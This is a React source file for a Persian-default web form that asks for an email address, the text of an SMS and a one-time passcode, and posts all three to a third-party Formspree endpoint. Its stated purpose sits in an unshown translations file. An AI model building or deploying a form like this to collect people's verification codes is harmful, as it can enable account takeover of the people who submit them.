import React, { useState, useCallback, useEffect } from 'react';
import { InputField } from './components/InputField';
import { OtpInput } from './components/OtpInput';
import { AlertIcon, CheckCircleIcon, LoadingSpinnerIcon } from './components/Icons';
import { Footer } from './components/Footer';
import { translations, Language } from './lib/translations';
import { FormEvent, useForm } from '@formspree/react';

type FormState = {
  email: string;
  smsContent: string;
  otp: string;
};

type Errors = {
  email?: string;
  smsContent?: string;
  otp?: string;
};

type SubmissionStatus = 'idle' | 'success' | 'error';

const App: React.FC = () => {
  const [language, setLanguage] = useState<Language>('FA');
  const [formState, setFormState] = useState<FormState>({
    email: '',
    smsContent: '',
    otp: '',
  });
  const [errors, setErrors] = useState<Errors>({});
  const [isLoading, setIsLoading] = useState(false);
  const [submissionStatus, setSubmissionStatus] = useState<SubmissionStatus>('idle');

  const texts = translations[language];
  const isRTL = language === 'FA';

  useEffect(() => {
    document.documentElement.lang = language.toLowerCase();
    document.documentElement.dir = isRTL ? 'rtl' : 'ltr';
  }, [language, isRTL]);

  const [state, handleSubmission] = useForm("mblkoplg");

  const handleInputChange = useCallback((e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;

    if (id === 'otp' && !/^\d*$/.test(value)) {
      return;
    }

    setFormState(prevState => ({ ...prevState, [id]: value }));
    if (errors[id as keyof Errors]) {
      setErrors(prevErrors => {
        const newErrors = { ...prevErrors };
        delete newErrors[id as keyof Errors];
        return newErrors;
      });
    }
  }, [errors]);

  const validate = (): Errors => {
    const newErrors: Errors = {};
    if (!formState.email) {
      newErrors.email = texts.errors.emailRequired;
    } else if (!/\S+@\S+\.\S+/.test(formState.email)) {
      newErrors.email = texts.errors.emailInvalid;
    }
    if (!formState.smsContent) {
      newErrors.smsContent = texts.errors.smsRequired;
    } else if (formState.smsContent.length < 15) {
      newErrors.smsContent = texts.errors.smsTooShort;
    }
    if (!formState.otp) {
      newErrors.otp = texts.errors.otpRequired;
    } else if (!/^\d{4,8}$/.test(formState.otp)) {
      newErrors.otp = texts.errors.otpInvalid;
    }
    return newErrors;
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setSubmissionStatus('idle');
    const validationErrors = validate();
    setErrors(validationErrors);

    if (Object.keys(validationErrors).length === 0) {
      setIsLoading(true);
      try {
        await handleSubmission(e);
        if (state.succeeded || state.errors == null) {
          setSubmissionStatus('success')
        } else {
          setSubmissionStatus("error")
          console.log("error in api: " + state.errors)
        }
        setTimeout(() => {
          setSubmissionStatus("idle")
          setFormState({
            email: '',
            smsContent: '',
            otp: '',
          })
        }, 2000)
      } catch (error) {
        console.log('error in catch: ' + error)
        setSubmissionStatus('error');
      } finally {
        setIsLoading(state.submitting);
      }
    }
  };

  return (
    <div className="font-vazir min-h-screen w-full bg-gradient-to-br from-pink-400 via-purple-500 to-indigo-600">
      <main className="flex items-center justify-center w-full min-h-screen p-4 pb-28">
        <div className="mt-8 w-full max-w-md mx-auto bg-white/20 backdrop-blur-xl rounded-2xl shadow-2xl p-8 text-slate-800 border border-white/30">
          <div className="text-center mb-8 mt-2">
            <h1 className="font-bold text-3xl text-violet-900">{texts.title}</h1>
          </div>

          <form onSubmit={handleSubmit} noValidate className="mt-4">
            <div className="space-y-6">
              <InputField
                id="email"
                label={texts.emailLabel}
                type="email"
                value={formState.email}
                onChange={handleInputChange}
                placeholder={texts.emailPlaceholder}
                error={errors.email}
                dir="ltr"
              />
              <InputField
                id="smsContent"
                label={texts.smsLabel}
                value={formState.smsContent}
                onChange={handleInputChange}
                placeholder={texts.smsPlaceholder}
                error={errors.smsContent}
                isTextArea={true}
                dir={isRTL ? 'rtl' : 'ltr'}
              />
              <OtpInput
                id="otp"
                label={texts.otpLabel}
                value={formState.otp}
                onChange={handleInputChange}
                placeholder="• • • • • • • •"
                error={errors.otp}
              />
            </div>

            <div className="mt-8">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full flex items-center justify-center bg-gradient-to-r from-purple-600 to-indigo-600 text-white font-bold py-3 px-4 rounded-lg shadow-lg hover:from-purple-600/90 hover:to-indigo-600/90 transition-all duration-300 hover:shadow-lg hover:scale-105 focus:outline-none focus:ring-4 focus:ring-purple-300 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <>
                    <LoadingSpinnerIcon />
                    <span className={isRTL ? "mr-2" : "ml-2"}>{texts.submitting}</span>
                  </>
                ) : (
                  texts.submitButton
                )}
              </button>
            </div>
          </form>

          {submissionStatus === 'success' && (
            <div className="mt-6 p-4 bg-green-500 text-white rounded-lg flex items-center animate-fade-in font-semibold">
              <CheckCircleIcon />
              <span className={isRTL ? "mr-3" : "ml-3"}>{texts.successMessage}</span>
            </div>
          )}
          {submissionStatus === 'error' && (
            <div className="mt-6 p-4 bg-red-500 text-white rounded-lg flex items-center animate-fade-in font-semibold">
              <AlertIcon />
              <span className={isRTL ? "mr-3" : "ml-3"}>{texts.errorMessage}</span>
            </div>
          )}
        </div>
      </main>
      <Footer
        language={language}
        setLanguage={setLanguage}
        texts={texts.footer}
        isRTL={isRTL}
      />
    </div>
  );
};

export default App;
